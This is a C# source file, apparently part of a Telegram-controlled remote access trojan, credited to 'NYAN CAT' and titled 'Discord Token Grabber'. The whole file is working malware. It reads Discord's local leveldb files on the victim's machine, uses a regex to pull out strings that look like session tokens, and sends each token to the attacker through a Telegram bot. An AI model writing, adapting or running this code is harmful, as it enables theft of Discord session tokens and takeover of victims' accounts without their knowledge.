// Author  : NYAN CAT
// Name    : Discord Token Grabber
// Contact : https://github.com/NYAN-x-CAT

using System;
using System.Collections.Generic;
using System.IO;
using System.Text.RegularExpressions;

namespace TelegramRAT
{
    internal class DiscordGrabber
    {

        // Get token
        public static void get()
        {
            var files = SearchForFile();
            if (files.Count == 0)
            {
                telegram.sendText("⛔ Didn't find any ldb files");
                return;
            }
            foreach (string token in files)
            {
                foreach (Match match in Regex.Matches(token, "[^\"]*"))
                {
                    if (match.Length == 59)
                    {
                        telegram.sendText($"💎 Discord token: {match.ToString()}");
                    }
                }
            }
        }

        // Locate *.ldb files
        private static List<string> SearchForFile()
        {
            List<string> ldbFiles = new List<string>();
            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";

            if (!Directory.Exists(discordPath))
            {
                telegram.sendText("🛠 Discord path not found");
                return ldbFiles;
            }

            foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
            {
                string rawText = File.ReadAllText(file);
                if (rawText.Contains("oken"))
                {
                    ldbFiles.Add(rawText);
                }
            }
            return ldbFiles;
        }


    }
}
